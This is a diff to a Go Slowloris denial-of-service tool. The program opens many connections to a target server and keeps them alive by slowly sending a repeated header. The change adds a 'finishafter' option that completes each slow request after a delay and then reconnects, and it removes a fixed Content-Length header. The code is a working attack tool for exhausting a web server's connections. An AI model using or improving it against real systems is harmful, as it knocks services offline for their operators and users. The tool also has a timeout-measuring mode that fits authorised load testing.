@@ -4,6 +4,7 @@ import (
 	"crypto/tls"
 	"flag"
 	"fmt"
+	"io/ioutil"
 	"net"
 	"net/http"
 	"os"
@@ -36,6 +37,7 @@ func main() {
 		https          bool
 		dosHeader      string
 		timermode      bool
+		finishAfter    int
 	)
 
 	flag.Usage = usage
@@ -48,6 +50,7 @@ func main() {
 	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
 	flag.BoolVar(&https, "https", false, "Use HTTPS")
 	flag.BoolVar(&timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
+	flag.IntVar(&finishAfter, "finishafter", 0, "Seconds to wait before finishing the request. If zero the request is never finished")
 	flag.Parse()
 
 	if len(flag.Args()) == 0 {
@@ -71,7 +74,7 @@ func main() {
 		go timer(target, method, resource, timeout, https)
 	} else {
 		for i := 0; i < numConnections; i++ {
-			go slowloris(target, dosHeader, method, resource, interval, timeout, https)
+			go slowloris(target, dosHeader, method, resource, interval, timeout, finishAfter, https)
 		}
 	}
 
@@ -127,9 +130,16 @@ func getTimeout(target, method, resource string, timeout int, https bool) time.D
 	panic("This should not happen!")
 }
 
-func slowloris(target, dosHeader, method, resource string, interval, timeout int, https bool) {
+func slowloris(target, dosHeader, method, resource string, interval, timeout, finishAfter int, https bool) {
 	var conn net.Conn
 	var err error
+
+	var timerChan <-chan time.Time
+	var timer *time.Timer
+	if finishAfter > 0 {
+		timer = time.NewTimer(time.Duration(finishAfter) * time.Second)
+		timerChan = timer.C
+	}
 
 loop:
 	for {
@@ -154,9 +164,19 @@ loop:
 		for {
 			select {
 			case <-time.After(time.Duration(interval) * time.Second):
+				if timer != nil {
+					timer.Reset(time.Duration(finishAfter) * time.Second)
+				}
 				if _, err := fmt.Fprintf(conn, "%s\r\n", dosHeader); err != nil {
 					continue loop
 				}
+
+			// if timerChan is nil (finishAfter =< 0) the case involving it will be omitted
+			case <-timerChan:
+				fmt.Fprintf(conn, "\r\n")
+				ioutil.ReadAll(conn) // omit return values
+				conn.Close()
+				continue loop
 			}
 		}
 	}
@@ -200,7 +220,6 @@ func makeHeaderSlice(host string) map[string]string {
 
 	headers["Host"] = host
 	headers["User-Agent"] = defaultUserAgent
-	headers["Content-Length"] = "42"
 
 	return headers
 }
